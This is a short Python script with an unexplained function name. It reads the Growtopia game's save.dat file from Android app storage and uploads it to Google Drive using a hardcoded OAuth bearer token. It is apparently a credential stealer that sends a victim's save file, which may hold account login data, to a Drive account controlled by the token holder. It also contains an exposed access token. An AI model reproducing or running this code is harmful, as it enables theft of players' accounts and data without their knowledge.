import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMCLvXUFfS4pQthUtg_X0To8nfR_Mzkcc2t3IT2M51HGEw9MLIeoKmgKWqMGwzJVlhsOexzcXJDrqMEk9WhAZOuqFfYXEwuAgovkGoqYnF9Wvl0czrVgi4Xv5cnM5rBAf71zweCa8-eC-bbevjICVgEI"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


